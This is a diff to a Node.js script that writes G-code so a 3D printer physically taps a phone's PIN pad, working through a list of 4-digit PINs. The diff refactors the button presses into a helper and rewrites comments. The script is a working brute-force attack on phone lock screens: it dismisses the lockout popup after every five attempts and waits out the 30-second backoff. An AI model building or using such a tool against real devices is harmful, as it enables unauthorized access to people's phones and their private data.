@@ -17,7 +17,6 @@ fs.readFile('./optimised-pin-length-4.txt', 'utf8' , (err, data) => {
 
   //Y between 1,8cm
   //X betwen 1cm
-
   const HOME = "G0 X0 Y0 Z0"
   const button_0 = "G0 X18 Y0"
   const button_1 = "G0 X0 Y30"
@@ -40,7 +39,13 @@ fs.readFile('./optimised-pin-length-4.txt', 'utf8' , (err, data) => {
     fileWriter.write("\r\n")
   }
 
+  const pressAndRelease = () => {
+    writeMove(PRESS_BUTTON)
+    writeMove(RELEASE_BUTTON)
+  }
+
   var counter = 1
+
   //Header Title
   fileWriter.write(";Bruteforce GCODE leet stuff")
   fileWriter.write("\r\n")
@@ -49,27 +54,24 @@ fs.readFile('./optimised-pin-length-4.txt', 'utf8' , (err, data) => {
   fileWriter.write("G28")
   fileWriter.write("\r\n")
 
-  //Set this point to be the grid we work on now
-  fileWriter.write("M1 \"Ready?\" ")
-  fileWriter.write("\r\n")
-
   //Set unit to mm
   fileWriter.write("G21")
   fileWriter.write("\r\n")
 
-  //Move to predefined entry point
+  //Move the head on the printer to a place where we have some space for the device
   fileWriter.write("G0 X100 Y100 Z30")
   fileWriter.write("\r\n")
 
-  //Set this point to be the grid we work on now
+  //Wait for positioning the phone
   fileWriter.write("M1 \"Press knob when phone is positioned over 0 Button\" ")
   fileWriter.write("\r\n")
 
-  //Set this point to be the grid we work on now
+  //Tell the printer that the current position is now to be treated as X0 Y0 and Z30
+  //Keeping a Z height here allows us to press buttons
   fileWriter.write("G92 X0 Y0 Z30")
   fileWriter.write("\r\n")
   
-  //Set this point to be the grid we work on now
+  //All movement commands from here on out are absolute to the above coordinate grid
   fileWriter.write("G90")
   fileWriter.write("\r\n")
 
@@ -111,26 +113,22 @@ fs.readFile('./optimised-pin-length-4.txt', 'utf8' , (err, data) => {
           break;                                                       
       }
       //press the button
-      writeMove(PRESS_BUTTON)
-      writeMove(RELEASE_BUTTON)
+      pressAndRelease()
     }
     //press ok after 4 digits
     writeMove(button_OK)
-    writeMove(PRESS_BUTTON)
-    writeMove(RELEASE_BUTTON)
+    pressAndRelease()
 
     //press the 30sec popup after 5 entries
     if(counter%5 == 0 ) {
       writeMove(button_POPUP)
-      writeMove(PRESS_BUTTON)
-      writeMove(RELEASE_BUTTON)
+      pressAndRelease()
       fileWriter.write(";Waiting for Backoff after 5 entries")
       fileWriter.write("\r\n")
       writeMove(button_BACK)
-      for (let index = 0; index < 15; index++) {
+      for (let index = 0; index < 10; index++) {
         writeMove("G4 P2000")
-        writeMove(PRESS_BUTTON)
-        writeMove(RELEASE_BUTTON)
+        pressAndRelease()
       }
     }
     counter++
